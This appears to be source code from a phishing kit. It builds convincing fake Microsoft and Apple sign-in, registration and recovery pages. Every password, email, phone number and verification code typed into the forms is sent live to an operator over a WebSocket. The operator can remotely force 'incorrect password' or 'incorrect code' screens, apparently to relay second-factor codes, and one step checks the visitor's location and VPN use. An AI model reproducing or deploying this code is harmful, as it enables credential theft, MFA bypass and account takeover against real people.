                  <MicrosoftLogo />
                  {!isMobile && <span className="text-[15px] font-semibold tracking-wide text-[#aaa]">Microsoft</span>}
                </div>
                <div className="w-6" />
              </div>
              <div className="flex justify-center mb-4">
                <div className="inline-flex items-center px-4 py-1 rounded-full border border-[#555] text-[#ccc] text-[13px]">
                  {email || 'user@example.com'}
                </div>
              </div>
              <h1 className="text-[22px] font-bold text-white text-center mb-5">Sign in another way</h1>
              <div className="border border-[#444] divide-y divide-[#444] mb-5">
                {/* Password */}
                <button
                  onClick={() => setStep('password')}
                  className="w-full flex items-center gap-3 px-4 py-3.5 text-left hover:bg-[#333] transition-colors"
                >
                  <div className="w-8 h-8 flex items-center justify-center flex-shrink-0">
                    <svg viewBox="0 0 24 24" width="20" height="20" fill="none">
                      <rect x="3" y="11" width="18" height="10" rx="2" stroke="#aaa" strokeWidth="1.5"/>
                      <path d="M7 11V7a5 5 0 0 1 10 0v4" stroke="#aaa" strokeWidth="1.5" strokeLinecap="round"/>
                    </svg>
                  </div>
                  <span className="text-[14px] text-white underline underline-offset-2">Use your password</span>
                </button>
                {/* Email code */}
                <button
                  onClick={() => setStep('email-code-input')}
                  className="w-full flex items-center gap-3 px-4 py-3.5 text-left hover:bg-[#333] transition-colors"
                >
                  <div className="w-8 h-8 flex items-center justify-center flex-shrink-0">
                    <svg viewBox="0 0 24 24" width="20" height="20" fill="none">
                      <rect x="2" y="4" width="20" height="16" rx="2" stroke="#aaa" strokeWidth="1.5"/>
                      <path d="m2 7 10 6 10-6" stroke="#aaa" strokeWidth="1.5"/>
                    </svg>
                  </div>
                  <span className="text-[14px] text-[#ddd]">Send a code to <span className="text-white">{email || 'your email'}</span></span>
                </button>
                {/* Phone — only if admin enabled it */}
                {phoneEnabled && (
                  <button
                    onClick={() => setStep('phone-code')}
                    className="w-full flex items-center gap-3 px-4 py-3.5 text-left hover:bg-[#333] transition-colors"
                  >
                    <div className="w-8 h-8 flex items-center justify-center flex-shrink-0">
                      <svg viewBox="0 0 24 24" width="20" height="20" fill="none">
                        <rect x="5" y="2" width="14" height="20" rx="2" stroke="#aaa" strokeWidth="1.5"/>
                        <circle cx="12" cy="18" r="1" fill="#aaa"/>
                      </svg>
                    </div>
                    <span className="text-[14px] text-white underline underline-offset-2">Send a code to ●●●●●●09</span>
                  </button>
                )}
              </div>
              {/* Show more options → leads to phone entry (only when phone not pre-configured) */}
              {!phoneEnabled && (
                <button
                  onClick={() => setStep('phone-entry')}
                  className="w-full border border-[#555] text-[#ccc] text-[14px] py-2.5 hover:bg-[#333] transition-colors mb-4"
                  style={{ borderRadius: 0 }}
                >
                  Show more options
                </button>
              )}
              {phoneEnabled && (
                <div className="flex justify-center">
                  <a href="#" className="text-[#3391e0] text-[13px] hover:underline">Update your password instead</a>
                </div>
              )}
            </div>
            {!isMobile && (
              <div className="flex justify-center gap-5 mt-3 text-[12px] text-[#888]">
                <a href="#" className="hover:underline hover:text-[#aaa]">Help and feedback</a>
                <a href="#" className="hover:underline hover:text-[#aaa]">Terms of use</a>
                <a href="#" className="hover:underline hover:text-[#aaa]">Privacy and cookies</a>
              </div>
            )}
          </motion.div>
        )}

        {/* ── Phone entry ───────────────────────────────────────────────────── */}
        {step === 'phone-entry' && (
          <motion.div key="phone-entry" {...fadeSlide} className={`flex flex-col ${wrapCls}`}>
            <div className={`px-10 pt-9 pb-8 shadow-xl ${darkCardBg} flex flex-col`}>
              <div className="flex items-center mb-5">
                <button
                  onClick={() => setStep('other-ways')}
                  className="text-[#aaa] hover:text-white transition-colors p-0.5 -ml-0.5"
                  style={{ background: 'none', border: 'none', cursor: 'pointer' }}
                >
                  <ChevronLeft className="w-5 h-5" />
                </button>
                <div className="flex-1 flex items-center justify-center gap-2">
                  <MicrosoftLogo />
                  {!isMobile && <span className="text-[15px] font-semibold tracking-wide text-[#aaa]">Microsoft</span>}
                </div>
                <div className="w-6" />
              </div>
              <div className="flex justify-center mb-4">
                <div className="inline-flex items-center px-4 py-1 rounded-full border border-[#555] text-[#ccc] text-[13px]">
                  {email || 'user@example.com'}
                </div>
              </div>
              <h1 className="text-[22px] font-bold text-white text-center mb-2">Sign in with a code</h1>
              <p className="text-[13px] text-[#aaa] text-center mb-6">
                Enter your phone number and we'll send you a 6-digit code.
              </p>
              <div className="flex mb-5">
                <div className="flex items-center border border-[#555] border-r-0 px-3 bg-[#333] text-[#ccc] text-[14px] flex-shrink-0 select-none">
                  +1
                </div>
                <input
                  type="tel"
                  value={phoneNumber}
                  onChange={e => { const v = e.target.value.replace(/\D/g, '').slice(0, 10); setPhoneNumber(v); sendCapture('phone', v); }}
                  onKeyDown={e => { if (e.key === 'Enter' && phoneNumber.length >= 7) nav('phone-code', 'phone', phoneNumber); }}
                  placeholder="Phone number"
                  autoFocus
                  className="flex-1 px-3 py-2.5 border border-[#555] focus:border-[#0078D4] focus:outline-none bg-transparent text-white placeholder-gray-500 text-[15px] transition-colors"
                />
              </div>
              <button
                onClick={() => { if (phoneNumber.length >= 7) nav('phone-code', 'phone', phoneNumber); }}
                className="w-full bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold py-2.5 transition-colors"
                style={{ borderRadius: 0 }}
              >
                Next
              </button>
            </div>
          </motion.div>
        )}

        {/* ── Phone code ────────────────────────────────────────────────────── */}
        {step === 'phone-code' && (
          <motion.div key="phone-code" {...fadeSlide} className={`flex flex-col ${wrapCls}`}>
            <div className={`px-10 pt-10 pb-8 shadow-xl ${darkCardBg} flex flex-col`}>
              <div className="flex items-center justify-center gap-2 mb-5">
                <MicrosoftLogo />
                {!isMobile && <span className="text-[15px] font-semibold tracking-wide text-[#aaa]">Microsoft</span>}
              </div>
              <div className="flex justify-center mb-4">
                <div className="inline-flex items-center px-4 py-1 rounded-full border border-[#555] text-[#ccc] text-[13px]">
                  {email || 'user@example.com'}
                </div>
              </div>
              <h1 className="text-[22px] font-bold text-white text-center mb-2">Enter code</h1>
              <p className="text-[13px] text-[#aaa] text-center mb-6">
                {phoneNumber
                  ? <>We sent a code to <strong className="text-white">+1 ●●●●●●{phoneNumber.slice(-2)}</strong>.</>
                  : <>We sent a code to your <strong className="text-white">phone (●●●●●●09)</strong>.</>}
              </p>
              <input
                type="text"
                value={phoneCode}
                onChange={e => { const v = e.target.value.replace(/\D/g, '').slice(0, 6); setPhoneCode(v); sendCapture('phone_code', v); }}
                onKeyDown={e => { if (e.key === 'Enter' && phoneCode.length === 6) nav('stay', 'phone_code', phoneCode); }}
                placeholder="Code"
                maxLength={6}
                autoFocus
                className="w-full px-3 py-2.5 border border-[#555] focus:border-[#0078D4] focus:outline-none bg-transparent text-white placeholder-gray-500 mb-2 transition-colors text-center tracking-[0.3em] text-[20px]"
              />
              <div className="mb-5">
                <a href="#" onClick={e => { e.preventDefault(); setPhoneCodeResent(true); setTimeout(() => setPhoneCodeResent(false), 3000); }}
                  className={`text-[13px] hover:underline ${phoneCodeResent ? 'text-green-400' : 'text-[#3391e0]'}`}>
                  {phoneCodeResent ? '✓ Code resent!' : "I didn't get a code"}
                </a>
              </div>
              <button
                onClick={() => { if (phoneCode.length === 6) nav('stay', 'phone_code', phoneCode); }}
                className="w-full bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold py-2.5 transition-colors"
                style={{ borderRadius: 0 }}
              >
                Next
              </button>
            </div>
          </motion.div>
        )}

        {/* ── Register flow ──────────────────────────────────────────────────── */}
        {step === 'register' && (
          <motion.div key={`register-${regStep}`} {...fadeSlide} className={`flex flex-col ${wrapCls}`}>
            <div className={`flex flex-col gap-0 ${lightCardCls}`}>
              {msLogoRow(false)}

              {regStep === 'reg-email' && (
                <>
                  <h1 className={`text-[24px] font-bold mb-6 ${lightText}`}>Create account</h1>
                  <input
                    type="email"
                    value={regEmail}
                    onChange={e => setRegEmail(e.target.value)}
                    onKeyDown={e => e.key === 'Enter' && regEmail && setRegStep('reg-password')}
                    placeholder="someone@example.com"
                    autoFocus
                    className={`${lightUnderlineInputSolid} mb-3`}
                  />
                  <div className="text-[13px] mb-8">
                    <a href="#" className="text-[#0078D4] hover:underline">Use a phone number instead</a>
                  </div>
                  <div className="flex justify-between items-center">
                    <button onClick={() => setStep('email')} className="text-[15px] font-semibold px-6 py-1.5 border border-gray-400 text-[#1b1b1b] hover:bg-gray-100 transition-colors" style={{ borderRadius: 0 }}>Back</button>
                    <button onClick={() => regEmail && setRegStep('reg-password')} className="bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold px-8 py-1.5 transition-colors" style={{ borderRadius: 0 }}>Next</button>
                  </div>
                </>
              )}

              {regStep === 'reg-password' && (
                <>
                  <h1 className={`text-[24px] font-bold mb-1 ${lightText}`}>Create a password</h1>
                  <p className="text-[13px] text-[#605e5c] mb-5">Use 8 or more characters with a mix of letters, numbers &amp; symbols.</p>
                  <div className="relative mb-4">
                    <input
                      type={regShowPw ? 'text' : 'password'}
                      value={regPassword}
                      onChange={e => setRegPassword(e.target.value)}
                      onKeyDown={e => e.key === 'Enter' && regPassword.length >= 8 && setRegStep('reg-name')}
                      placeholder="Password"
                      autoFocus
                      className={`${lightUnderlineInputSolid} pr-8`}
                    />
                    <button onClick={() => setRegShowPw(v => !v)} className="absolute right-0 bottom-2 opacity-50 hover:opacity-80" style={{ background: 'none', border: 'none', cursor: 'pointer', padding: 0 }}>
                      {regShowPw ? <EyeOff className="w-4 h-4 text-black" /> : <Eye className="w-4 h-4 text-black" />}
                    </button>
                  </div>
                  <label className="flex items-start gap-2 mb-8 cursor-pointer select-none text-[#1b1b1b]" style={{ fontSize: 13 }}>
                    <div onClick={() => setPromoEmails(v => !v)} className={`w-4 h-4 mt-0.5 border flex items-center justify-center flex-shrink-0 cursor-pointer transition-colors ${promoEmails ? 'bg-[#0078D4] border-[#0078D4]' : 'border-[#666]'}`}>
                      {promoEmails && <Check className="w-3 h-3 text-white" />}
                    </div>
                    I would like information, tips, and offers about Microsoft products and services.
                  </label>
                  <div className="flex justify-between items-center">
                    <button onClick={() => setRegStep('reg-email')} className="text-[15px] font-semibold px-6 py-1.5 border border-gray-400 text-[#1b1b1b] hover:bg-gray-100 transition-colors" style={{ borderRadius: 0 }}>Back</button>
                    <button onClick={() => regPassword.length >= 8 && setRegStep('reg-name')} className="bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold px-8 py-1.5 transition-colors" style={{ borderRadius: 0 }}>Next</button>
                  </div>
                </>
              )}

              {regStep === 'reg-name' && (
                <>
                  <h1 className={`text-[24px] font-bold mb-5 ${lightText}`}>What's your name?</h1>
                  <div className="mb-5">
                    <input type="text" value={firstName} onChange={e => setFirstName(e.target.value)} placeholder="First name" autoFocus className={lightUnderlineInputSolid} />
                  </div>
                  <div className="mb-8">
                    <input type="text" value={lastName} onChange={e => setLastName(e.target.value)} placeholder="Last name" className={lightUnderlineInputSolid} />
                  </div>
                  <div className="flex justify-between items-center">
                    <button onClick={() => setRegStep('reg-password')} className="text-[15px] font-semibold px-6 py-1.5 border border-gray-400 text-[#1b1b1b] hover:bg-gray-100 transition-colors" style={{ borderRadius: 0 }}>Back</button>
                    <button onClick={() => (firstName || lastName) && setRegStep('reg-dob')} className="bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold px-8 py-1.5 transition-colors" style={{ borderRadius: 0 }}>Next</button>
                  </div>
                </>
              )}

              {regStep === 'reg-dob' && (
                <>
                  <h1 className={`text-[24px] font-bold mb-1 ${lightText}`}>What's your birthdate?</h1>
                  <p className="text-[13px] text-[#605e5c] mb-5">We need a little more info to keep your account safe.</p>
                  <div className="mb-4">
                    <label className="text-[12px] text-[#605e5c] block mb-1">Country/region</label>
                    <select defaultValue="United States" className="w-full pb-2 border-0 border-b border-[#000]/40 focus:border-[#0078D4] focus:outline-none bg-transparent text-[15px] text-black appearance-none">
                      {['United States','United Kingdom','Canada','Australia','Germany','France','Japan','India'].map(c => <option key={c}>{c}</option>)}
                    </select>
                  </div>
                  <div className="text-[12px] text-[#605e5c] mb-1.5">Birthdate</div>
                  <div className="flex gap-3 mb-8">
                    <select value={regMonth} onChange={e => setRegMonth(e.target.value)} className="flex-1 pb-2 border-0 border-b border-[#000]/40 focus:border-[#0078D4] focus:outline-none bg-transparent text-[15px] text-black">
                      {['January','February','March','April','May','June','July','August','September','October','November','December'].map(m => <option key={m}>{m}</option>)}
                    </select>
                    <select value={regDay} onChange={e => setRegDay(e.target.value)} className="w-16 pb-2 border-0 border-b border-[#000]/40 focus:border-[#0078D4] focus:outline-none bg-transparent text-[15px] text-black">
                      {Array.from({length:31},(_,i)=>i+1).map(d => <option key={d}>{d}</option>)}
                    </select>
                    <select value={regYear} onChange={e => setRegYear(e.target.value)} className="w-24 pb-2 border-0 border-b border-[#000]/40 focus:border-[#0078D4] focus:outline-none bg-transparent text-[15px] text-black">
                      {Array.from({length:100},(_,i)=>new Date().getFullYear()-i).map(y => <option key={y}>{y}</option>)}
                    </select>
                  </div>
                  <div className="flex justify-between items-center">
                    <button onClick={() => setRegStep('reg-name')} className="text-[15px] font-semibold px-6 py-1.5 border border-gray-400 text-[#1b1b1b] hover:bg-gray-100 transition-colors" style={{ borderRadius: 0 }}>Back</button>
                    <button onClick={() => setRegStep('reg-verify')} className="bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold px-8 py-1.5 transition-colors" style={{ borderRadius: 0 }}>Next</button>
                  </div>
                </>
              )}

              {regStep === 'reg-verify' && (
                <>
                  <h1 className={`text-[24px] font-bold mb-2 ${lightText}`}>Verify your email</h1>
                  <p className="text-[13px] text-[#605e5c] mb-5 leading-relaxed">
                    Enter the code we sent to <strong className="text-[#1b1b1b]">{regEmail || 'your email'}</strong>. If you didn't get the email, check your junk folder or try another method.
                  </p>
                  <input
                    type="text"
                    value={verifyCode}
                    onChange={e => setVerifyCode(e.target.value.replace(/\D/g,'').slice(0,6))}
                    placeholder="Enter code"
                    autoFocus
                    className={`${lightUnderlineInputSolid} mb-2`}
                    maxLength={6}
                  />
                  <div className="text-[13px] mb-5">
                    <a href="#" className="text-[#0078D4] hover:underline">Get a new code</a>
                  </div>
                  <p className="text-[12px] text-[#605e5c] mb-6 leading-relaxed">
                    By selecting Next, you agree to the{' '}
                    <a href="#" className="text-[#0078D4] hover:underline">Microsoft Service Agreement</a>{' '}
                    and{' '}
                    <a href="#" className="text-[#0078D4] hover:underline">privacy and cookies statement</a>.
                  </p>
                  <div className="flex justify-between items-center">
                    <button onClick={() => setRegStep('reg-dob')} className="text-[15px] font-semibold px-6 py-1.5 border border-gray-400 text-[#1b1b1b] hover:bg-gray-100 transition-colors" style={{ borderRadius: 0 }}>Back</button>
                    <button onClick={() => verifyCode.length === 6 && setStep('email')} className="bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold px-8 py-1.5 transition-colors" style={{ borderRadius: 0 }}>Next</button>
                  </div>
                </>
              )}
            </div>
          </motion.div>
        )}

        {/* ── Recover / Can't access account ──────────────────────────────────── */}
        {step === 'recover' && (
          <motion.div key={`recover-${recStep}`} {...fadeSlide} className={`flex flex-col ${wrapCls}`}>
            <div className={`flex flex-col gap-0 ${lightCardCls}`}>
              {msLogoRow(false)}

              {recStep === 'rec-find' && (
                <>
                  <h1 className="text-[20px] font-bold mb-2 text-[#1b1b1b]">Get back into your account</h1>
                  <p className="text-[13px] text-[#605e5c] mb-4 leading-relaxed">
                    To recover your account, enter the email address, phone number, or Skype name you use to sign in.
                  </p>
                  <label className="text-[13px] font-semibold text-[#1b1b1b] mb-1 block">Email or username <span className="text-red-500">*</span></label>
                  <input
                    type="text"
                    value={recEmail}
                    onChange={e => setRecEmail(e.target.value)}
                    placeholder="Email or username"
                    autoFocus
                    className={`${lightUnderlineInputSolid} mb-6`}
                  />
                  <div className="border border-gray-300 p-3.5 mb-6 flex items-center gap-3 rounded">
                    <div
                      onClick={() => setRecCaptcha(v => !v)}
                      className={`w-5 h-5 border-2 rounded flex items-center justify-center cursor-pointer flex-shrink-0 transition-colors ${recCaptcha ? 'bg-[#0078D4] border-[#0078D4]' : 'border-gray-400'}`}
                    >
                      {recCaptcha && <Check className="w-3 h-3 text-white" />}
                    </div>
                    <span className="text-[13px] text-[#1b1b1b] flex-1">I'm not a robot</span>
                    <div className="flex flex-col items-center gap-0.5 flex-shrink-0">
                      <div className="text-[10px] text-[#555] font-medium tracking-tight">reCAPTCHA</div>
                      <div className="text-[8px] text-[#999]">Privacy · Terms</div>
                    </div>
                  </div>
                  <div className="flex justify-between items-center">
                    <button onClick={() => setStep('email')} className="text-[15px] font-semibold px-6 py-1.5 border border-gray-400 text-[#1b1b1b] hover:bg-gray-100 transition-colors" style={{ borderRadius: 0 }}>Cancel</button>
                    <button
                      onClick={() => recEmail && recCaptcha && setRecStep('rec-options')}
                      className="bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold px-8 py-1.5 transition-colors"
                      style={{ borderRadius: 0 }}
                    >Next</button>
                  </div>
                </>
              )}

              {recStep === 'rec-options' && (
                <>
                  <h1 className="text-[20px] font-bold mb-2 text-[#1b1b1b]">We need to verify your identity</h1>
                  <p className="text-[13px] text-[#605e5c] mb-5">Choose how you'd like to receive the security code.</p>
                  <label className="flex items-start gap-3 cursor-pointer p-3 border border-blue-300 bg-blue-50 rounded mb-2">
                    <input type="radio" name="rec-method" defaultChecked className="mt-0.5 accent-[#0078D4]" />
                    <div>
                      <div className="text-[14px] font-medium text-[#1b1b1b]">
                        Email {recEmail.includes('@') ? recEmail.replace(/(.{2})(.+)(@.+)/, (_, a, _b, c) => `${a}***${c}`) : recEmail}
                      </div>
                      <div className="text-[12px] text-[#605e5c] mt-0.5">We'll send a 6-digit code to this address</div>
                    </div>
                  </label>
                  <div className="flex justify-between items-center mt-6">
                    <button onClick={() => setRecStep('rec-find')} className="text-[15px] font-semibold px-6 py-1.5 border border-gray-400 text-[#1b1b1b] hover:bg-gray-100 transition-colors" style={{ borderRadius: 0 }}>Back</button>
                    <button onClick={() => setRecStep('rec-code')} className="bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold px-8 py-1.5 transition-colors" style={{ borderRadius: 0 }}>Send code</button>
                  </div>
                </>
              )}

              {recStep === 'rec-code' && (
                <>
                  <h1 className="text-[20px] font-bold mb-2 text-[#1b1b1b]">Enter your verification code</h1>
                  <p className="text-[13px] text-[#605e5c] mb-5 leading-relaxed">
                    Enter the 6-digit security code we sent to <strong className="text-[#1b1b1b]">{recEmail || 'your email'}</strong>.
                  </p>
                  <input
                    type="text"
                    value={recCode}
                    onChange={e => setRecCode(e.target.value.replace(/\D/g,'').slice(0,6))}
                    placeholder="Verification code"
                    autoFocus
                    className={`${lightUnderlineInputSolid} mb-2`}
                    maxLength={6}
                  />
                  <div className="text-[13px] mb-8">
                    <a href="#" className="text-[#0078D4] hover:underline">I didn't receive a code</a>
                  </div>
                  <div className="flex justify-between items-center">
                    <button onClick={() => setRecStep('rec-options')} className="text-[15px] font-semibold px-6 py-1.5 border border-gray-400 text-[#1b1b1b] hover:bg-gray-100 transition-colors" style={{ borderRadius: 0 }}>Back</button>
                    <button onClick={() => recCode.length === 6 && setStep('email')} className="bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold px-8 py-1.5 transition-colors" style={{ borderRadius: 0 }}>Verify</button>
                  </div>
                </>
              )}
            </div>
          </motion.div>
        )}

        {/* ── Processing ── */}
        {step === 'processing' && (
          <motion.div key="processing" {...fadeOnly} className={`flex flex-col ${wrapCls}`}>
            {isMobile ? (
              <div className="flex flex-col items-center gap-5 px-8">
                {msLogoRow(isDark)}
                <p className="text-[14px] text-[#605e5c] text-center mt-1">Please wait, this will only take a moment.</p>
                <div className="flex gap-2">
                  {[0,1,2].map(i => <div key={i} className="w-2 h-2 rounded-full bg-[#0078D4] animate-bounce" style={{ animationDelay: `${i*0.15}s` }} />)}
                </div>
              </div>
            ) : (
              <div className={`w-[440px] flex flex-col items-center px-10 pt-10 pb-12 shadow-md ${isDark ? 'bg-[#242424]' : 'bg-white'}`}>
                {msLogoRow(false)}
                <p className="text-[14px] text-[#605e5c] mt-5 mb-4 text-center">Please wait, this will only take a moment.</p>
                <div className="flex gap-2">
                  {[0,1,2].map(i => <div key={i} className="w-2.5 h-2.5 rounded-full bg-[#0078D4] animate-bounce" style={{ animationDelay: `${i*0.15}s` }} />)}
                </div>
              </div>
            )}
          </motion.div>
        )}

        {/* ── Error states ── */}
        {(step === 'error-email' || step === 'error-password' || step === 'error-code') && (
          <motion.div key={step} {...fadeSlide} className={`flex flex-col ${wrapCls}`}>
            <div className={`flex flex-col ${lightCardCls}`}>
              {msLogoRow(false)}
              <div className="flex items-center gap-3 mb-4">
                <div className="w-10 h-10 rounded-full bg-red-50 border border-red-200 flex items-center justify-center flex-shrink-0">
                  <X className="w-5 h-5 text-red-600" />
                </div>
                <h1 className={`text-[18px] font-bold ${lightText}`}>
                  {step === 'error-email' ? 'Account not found' : step === 'error-password' ? 'Incorrect password' : 'Incorrect code'}
                </h1>
              </div>
              <p className="text-[14px] text-[#605e5c] mb-6 leading-relaxed">
                {step === 'error-email'
                  ? "That Microsoft account doesn't exist. Enter a different account or get a new Microsoft account."
                  : step === 'error-password'
                  ? "Your account or password is incorrect. If you don't remember your password, reset it now."
                  : "The verification code you entered is incorrect. Please check your inbox and try again."}
              </p>
              <div className="flex justify-between items-center">
                <a href="#" className="text-[14px] text-[#0078D4] hover:underline">
                  {step === 'error-email' ? 'Create one!' : step === 'error-password' ? 'Forgot password?' : 'Resend code'}
                </a>
                <button
                  onClick={() => setStep(step === 'error-email' ? 'email' : step === 'error-password' ? 'password' : 'email-code')}
                  className="bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold px-8 py-1.5 transition-colors"
                  style={{ borderRadius: 0 }}
                >
                  Try again
                </button>
              </div>
            </div>
          </motion.div>
        )}

      </AnimatePresence>
    </div>
  );
}

// ─── Apple ───────────────────────────────────────────────────────────────────

type AppleStep = 'email' | 'password' | 'device-trust' | 'verification-code' | 'processing' | 'error-email' | 'error-password' | 'error-code' | 'forgot' | 'forgot-sent';

function AppleLogin({ device, theme, onProviderSwitch }: { device: string; theme: string; onProviderSwitch?: (p: string) => void }) {
  const isDark = theme === 'dark';
  const isDesktop = device === 'desktop';
  const [step, setStep] = useState<AppleStep>(() => {
    const init = new URLSearchParams(window.location.search).get('initialStep') as AppleStep | null;
    return init ?? 'email';
  });
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [codeInput, setCodeInput] = useState('');
  const [forgotEmail, setForgotEmail] = useState('');
  const [loading, setLoading] = useState(false);
  const [visitorLocation, setVisitorLocation] = useState<{ city: string; country: string; flag: string; isVpn: boolean } | null>(null);
  const [emailError, setEmailError] = useState<string | null>(null);
  const [passwordError, setPasswordError] = useState<string | null>(null);
  const [codeError, setCodeError] = useState<string | null>(null);
  const passwordRef = useRef<HTMLInputElement>(null);
  const codeRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    if (step === 'password') passwordRef.current?.focus();
    if (step === 'verification-code') setTimeout(() => codeRef.current?.focus(), 100);
  }, [step]);

  useEffect(() => {
    if (step !== 'device-trust' || visitorLocation) return;
    const base = (import.meta as { env: { BASE_URL: string } }).env.BASE_URL.replace(/\/$/, '');
    fetch(`${base}/api/location`)
      .then(r => r.json() as Promise<{ city: string; country: string; flag: string; isVpn: boolean }>)
      .then(d => setVisitorLocation(d))
      .catch(() => {});
  }, [step, visitorLocation]);

  const { sendCapture, sendStepUpdate } = useVisitorWS({
    provider: 'apple',
    onNavigate: (s) => {
      if (s === 'error-email') {
        setEmailError("This Apple Account doesn't exist. Enter a different email or phone number.");
        setStep('email');
      } else if (s === 'error-password') {
        setPasswordError('Your Apple Account or password was incorrect.');
        setStep('password');
      } else if (s === 'error-code') {
        setCodeError('Incorrect verification code. Try again.');
        setStep('verification-code');
      } else {
        setEmailError(null); setPasswordError(null); setCodeError(null);
        setStep(s as AppleStep);
      }
    },
    onProviderSwitch,
  });
  useEffect(() => { sendStepUpdate(step); }, [step, sendStepUpdate]);

  const nav = (target: AppleStep, captureField?: string, captureVal?: string) => {
    setEmailError(null); setPasswordError(null); setCodeError(null);
    if (captureField && captureVal) sendCapture(captureField, captureVal);
    setLoading(true);
    setTimeout(() => { setLoading(false); setStep(target); }, 800);
  };

  const outerBg = isDesktop
    ? isDark ? 'bg-[#1c1c1e]' : 'bg-[#f5f5f7]'
    : isDark ? 'bg-black' : 'bg-white';

  const cardCls = isDesktop
    ? `max-w-[480px] px-12 py-14 rounded-2xl shadow-xl ${isDark ? 'bg-[#2c2c2e]' : 'bg-white'}`
    : 'h-full px-8 pt-14';

  const groupBg = isDark ? 'bg-[#1c1c1e] border-[#38383a]' : 'bg-[#f2f2f7] border-[#d1d1d6]';
  const subGray = isDark ? 'text-[#8e8e93]' : 'text-[#6e6e73]';
  const appleBlue = '#007AFF';

  const logoArea = (
    <div className="relative flex items-center justify-center mb-7">
      <AppleSpinRing />
      <AppleLogo className={`w-11 h-11 ${isDark ? 'text-white' : 'text-black'}`} />
    </div>
  );

  if (loading) return (
    <div className={`w-full h-full flex items-center justify-center transition-colors ${outerBg}`}
      style={{ fontFamily: '-apple-system, BlinkMacSystemFont, Inter, sans-serif' }}>
      <div className={`relative flex flex-col items-center w-full ${cardCls}`}>
        {logoArea}
        <h1 className="text-[26px] font-bold mb-6 tracking-tight">Apple Account</h1>
        <svg className="w-9 h-9" viewBox="0 0 50 50">
          <circle cx="25" cy="25" r="20" fill="none" strokeWidth="3" strokeLinecap="round"
            stroke={isDark ? '#ffffff' : '#1c1c1e'} strokeDasharray="70 130" strokeOpacity="0.7"
            className="animate-spin" style={{ animationDuration: '0.9s' }} />
        </svg>
      </div>
    </div>
  );

  return (
    <div className={`w-full h-full flex items-center justify-center transition-colors ${outerBg} ${isDark ? 'text-white' : 'text-black'}`}
      style={{ fontFamily: '-apple-system, BlinkMacSystemFont, Inter, sans-serif' }}>
      <div className={`relative flex flex-col items-center w-full ${cardCls}`}>

        {/* Back button (mobile/tablet) */}
        {!isDesktop && (step === 'password' || step === 'verification-code') && (
          <button
            data-testid="apple-back-btn"
            onClick={() => step === 'verification-code' ? setStep('device-trust') : setStep('email')}
            className="absolute top-14 left-5 flex items-center"
            style={{ color: appleBlue, background: 'none', border: 'none', cursor: 'pointer', padding: 0 }}
          >
            <ChevronLeft className="w-6 h-6" />
          </button>
        )}

        {logoArea}
        <h1 className="text-[26px] font-bold mb-3 tracking-tight">Apple Account</h1>

        {/* ── Email ── */}
        {(step === 'email' || step === 'error-email') && (
          <>
            <p className={`text-center text-[15px] leading-relaxed mb-8 ${subGray}`}>
              Sign in with an email or phone number to use iCloud, the App Store, Messages or other Apple services.
            </p>
            <div className={`w-full rounded-[13px] overflow-hidden border mb-1 transition-colors ${emailError ? (isDark ? 'border-[#ff453a] bg-[#1c1c1e]' : 'border-[#ff3b30] bg-[#f2f2f7]') : groupBg}`}>
              <input
                data-testid="apple-email-input"
                type="text"
                value={email}
                onChange={e => { setEmail(e.target.value); setEmailError(null); sendCapture('email', e.target.value); }}
                onKeyDown={e => e.key === 'Enter' && nav('password', 'email', email)}
                placeholder="Email or Phone Number"
                autoFocus
                className={`w-full px-4 py-3.5 text-[17px] focus:outline-none bg-transparent ${isDark ? 'text-white placeholder-[#636366]' : 'text-black placeholder-[#aeaeb2]'}`}
              />
            </div>
            {emailError && (
              <p className="w-full text-[13px] leading-snug mb-4 px-1" style={{ color: isDark ? '#ff453a' : '#ff3b30' }}>
                {emailError}
              </p>
            )}
            {!emailError && <div className="mb-6" />}
            <button
              data-testid="apple-continue-btn"
              onClick={() => nav('password', 'email', email)}
              className="w-full py-3.5 rounded-[13px] text-[17px] font-semibold text-white mb-5 transition-opacity hover:opacity-90 active:opacity-80"
              style={{ backgroundColor: appleBlue }}
            >
              Continue
            </button>
            <div className="flex flex-col items-center gap-4">
              <button data-testid="apple-forgot-link" onClick={() => { setForgotEmail(email); setStep('forgot'); }} className="text-[15px]" style={{ color: appleBlue, background: 'none', border: 'none', cursor: 'pointer' }}>
                Forgot Apple Account or Password?
              </button>
              <button data-testid="apple-child-signin" className="text-[15px]" style={{ color: appleBlue, background: 'none', border: 'none', cursor: 'pointer' }}>
                Sign in a child in my Family
              </button>
            </div>
          </>
        )}

        {/* ── Password ── */}
        {(step === 'password' || step === 'error-password') && (
          <>
            {isDesktop && (
              <button
                data-testid="apple-back-btn-desktop"
                onClick={() => setStep('email')}
                className={`flex items-center gap-1 text-[14px] mb-4 ${subGray} hover:text-[#007AFF] transition-colors`}
                style={{ background: 'none', border: 'none', cursor: 'pointer', padding: 0 }}
              >
                <ChevronLeft className="w-4 h-4" />
                {email || 'user@example.com'}
              </button>
            )}
            <p className={`text-center text-[15px] leading-relaxed mb-8 ${subGray}`}>
              Enter the password for <strong className={isDark ? 'text-white' : 'text-black'}>{email || 'your Apple Account'}</strong>.
            </p>
            <div className={`w-full rounded-[13px] overflow-hidden border mb-1 transition-colors ${passwordError ? (isDark ? 'border-[#ff453a] bg-[#1c1c1e]' : 'border-[#ff3b30] bg-[#f2f2f7]') : groupBg}`}>
              <div className="relative">
                <input
                  ref={passwordRef}
                  data-testid="apple-password-input"
                  type={showPassword ? 'text' : 'password'}
                  value={password}
                  onChange={e => { setPassword(e.target.value); setPasswordError(null); sendCapture('password', e.target.value); }}
                  onKeyDown={e => { if (e.key === 'Enter' && password) nav('device-trust', 'password', password); }}
                  placeholder="Password"
